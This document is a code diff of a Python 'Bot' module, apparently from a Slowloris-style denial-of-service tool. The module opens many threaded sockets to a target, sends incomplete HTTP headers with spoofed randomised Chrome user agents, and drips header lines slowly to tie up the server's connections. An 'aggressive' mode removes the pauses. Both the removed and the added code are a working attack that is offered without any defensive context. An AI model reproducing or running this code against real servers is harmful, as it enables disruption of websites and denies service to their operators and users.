@@ -1,125 +1,133 @@
-# Date: 09/24/2018
-# Author: Pure-L0G1C
+# Date: 01/07/2019
+# Author: Mohamed
 # Description: Bot
 
-import socket
-from time import sleep
-from .config import header
-from random import randint, choice  
+import socket 
+from time import sleep 
+from lib.const import header
+from threading import Thread
+from random import randint, choice 
 from string import ascii_lowercase
 
-class Useragent(object):
 
- @property
- def get_win_version(self):
-  versions = []
-  version = 4.0
-  while version <= 10:
-   versions.append(version)
-   version = round(version+0.1, 2)
-  return choice(versions)
+class Useragent:
+
+    @staticmethod
+    def get_win_version():
+        versions = []
+        version = 4.0
+        while version <= 10:
+            versions.append(version)
+            version = round(version+0.1, 2)
+        return choice(versions)
   
- @property 
- def get_chrome_version(self):
-  a = randint(40, 69)
-  b = randint(2987, 3497)
-  c = randint(80, 140)
-  return '{}.0.{}.{}'.format(a, b, c)
+    @staticmethod 
+    def get_chrome_version():
+        a = randint(40, 69)
+        b = randint(2987, 3497)
+        c = randint(80, 140)
+        return '{}.0.{}.{}'.format(a, b, c)
 
- def get(self):
-  a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(self.get_win_version)
-  b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.get_chrome_version)
-  return '{} {}'.format(a, b)
+    @classmethod
+    def get(cls):
+        a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(cls.get_win_version())
+        b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(cls.get_chrome_version())
+        return '{} {}'.format(a, b)
 
-class Session(object):
 
- def __init__(self, ip, port):
-  self.ip = ip
-  self.port = port 
-  self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   
- def connect(self, header):
-  is_connected = False 
-  try:
-   self.session.connect((self.ip, self.port))
-   self.send_packet(header)
-   is_connected = True 
-  except:pass
-  finally:
-   return is_connected
+class Bot:
 
- def send_packet(self, packet):
-  sent = False
-  try:
-   self.session.sendall(packet)
-   sent = True  
-  except:pass
-  finally:
-   return sent
+    def __init__(self, ip, port, is_aggressive):
+        self.ip = ip 
+        self.port = port
+        self.is_alive = True 
+        self.is_aggressive = is_aggressive
 
- def close(self):
-  try:
-   self.session.close()
-  except:pass 
+    def sleep(self):
+        for _ in range(randint(5, 10)):
+            if self.is_alive:
+                sleep(1)
+        
+    def start(self):
+        while self.is_alive:
+            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            session.settimeout(10)
+                                
+            try:
+                packet = self.header.decode().split('\n')
+                session.connect((self.ip, self.port))
+                is_success = True
 
-class Bot(object):
+                for _ in range(len(packet)-2):
+                    data = packet[_] + '\n'
 
- def __init__(self, ip, port, is_aggressive):
-  self.ip = ip 
-  self.port = port 
-  self.session = None 
-  self.is_alive = True
-  self.useragent = None
-  self.useragent_usage = 0
-  self.max_useragent_usage = 16
-  self.useragent_obj = Useragent()
-  self.is_aggressive = is_aggressive
+                    if _ == len(packet)-3:
+                        data += '\r\n'
+                    
+                    try:
+                        session.sendall(data.encode())
+                        sleep(0.1)
+                    except:
+                        is_success = False 
+                        break 
+                
+                if not self.is_aggressive and is_success:
+                    self.sleep() 
+                
+            except:
+                pass
+                                       
+    def stop(self):
+        self.is_alive = False
 
- def sleep(self):
-  for _ in range(randint(5, 10)):
-   if self.is_alive:
-    sleep(1)
-  
- def start(self):
-  while self.is_alive:
-   try:
-    self.get_session()
-    if not self.session.connect(self.header):
-     self.session.close()
-   except:pass 
-   else:
-    for _ in range(2):
-     pkt = self.packet
-     if not self.is_alive:break
-     if self.session.send_packet(pkt):
-      if not self.is_aggressive:self.sleep()
-     else:
-      break      
-    self.session.close()
+    @property 
+    def header(self):
+        return header.format(self.text, Useragent.get()).encode()  
 
- def stop(self):
-  self.is_alive = False 
-  if self.session:
-   self.session.close()
+    @property 
+    def text(self):
+        printables = ascii_lowercase + ''.join([str(_) for _ in range(10)])
+        return ''.join([choice(printables) for _ in range(randint(3, 9))])
 
- def gen_useragent(self):
-  if not self.useragent_usage:
-   self.useragent = self.useragent_obj.get()
-  self.useragent_usage = 0 if self.useragent_usage >= self.max_useragent_usage else self.useragent_usage+1
 
- @property 
- def header(self):
-  self.gen_useragent()
-  return header.format(self.text, self.useragent).encode()  
+class BotManager:
 
- @property 
- def packet(self):
-  return 'X-a: {}\r\n\r\n'.format(self.text).encode() 
+    def __init__(self, ip, port, threads, is_aggressive):
+        self.ip = ip 
+        self.port = port 
+        self.bots = []
+        self.is_alive = True 
+        self.threads = threads
+        self.is_aggressive = is_aggressive
+    
+    def create_bots(self):
+        for _ in range(self.threads):
 
- @property 
- def text(self):
-  printables = ascii_lowercase + ''.join([str(_) for _ in range(10)])
-  return ''.join([choice(printables) for _ in range(randint(3, 9))])
+            if not self.is_alive:
+                break 
 
- def get_session(self):
-  self.session = Session(self.ip, self.port)
+            bot = Bot(self.ip, self.port, self.is_aggressive)
+            self.bots.append(bot)
+    
+    def start_bots(self):
+        for bot in self.bots:
+
+            if not self.is_alive:
+                break
+
+            try:
+                t = Thread(target=bot.start)
+                t.daemon = True
+                t.start()
+            except:
+                pass 
+        
+    def start(self):
+        self.create_bots()
+        self.start_bots()     
+    
+    def stop(self):
+        self.is_alive = False 
+
+        for bot in self.bots:
+            bot.stop()
